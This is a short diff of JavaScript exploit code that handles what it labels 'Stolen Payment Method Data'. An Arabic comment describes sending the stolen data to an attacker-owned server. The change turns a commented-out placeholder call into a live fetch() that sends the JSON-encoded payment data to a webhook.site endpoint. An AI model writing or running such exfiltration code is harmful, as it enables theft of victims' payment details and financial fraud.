@@ -26,7 +26,7 @@
             console.log("Stolen Payment Method Data:", data);
 
             // خطوة إضافية لو عايز تسرق الداتا وتبعتها لسيرفر خارجي تملكه (Data Exfiltration):
-            // fetch("https://your-attacker-server.com/log?data=" + encodeURIComponent(JSON.stringify(data)));
+            fetch("https://webhook.site/d80e6a3b-5db7-401f-a4a9-04facede08b0/log?data=" + encodeURIComponent(JSON.stringify(data)));
         })
         .catch(error => {
             console.error("Exploit Failed:", error);
